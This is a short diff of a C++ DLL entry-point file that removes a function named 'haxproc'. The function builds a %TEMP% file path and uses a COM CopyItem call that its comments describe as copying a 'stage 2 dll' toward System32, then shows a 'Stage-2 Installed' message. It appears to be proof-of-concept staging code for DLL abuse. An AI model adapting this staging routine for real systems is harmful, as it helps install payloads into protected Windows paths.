@@ -1,6 +1,6 @@
 //// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
 //
-/
+
 
 
 // dllmain.cpp : Define el punto de entrada de la aplicación DLL.
@@ -113,24 +113,4 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		break;
 	}
 	return TRUE;
-}
-
-int haxproc()
-{
-	//IMPORTANT: This is an unicode dll
-	//Resolve %TEMP% path
-	wchar_t* source;
-	source = _wgetenv(L"TEMP");
-	wcscat(source, L"\\test.txt");
-	LPCWSTR temp = source;
-
-	//Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
-	HRESULT test = CopyItem(temp, L"C:\\Users\\codeb\\Desktop\\test", L"hack.txt"); //Resolve the windows path it may not be in C:
-	if (SUCCEEDED(test))
-	{
-		MessageBox(0, L"Stage-2 Installed", 0, 0);
-	}
-
-
-	return 0;
 }
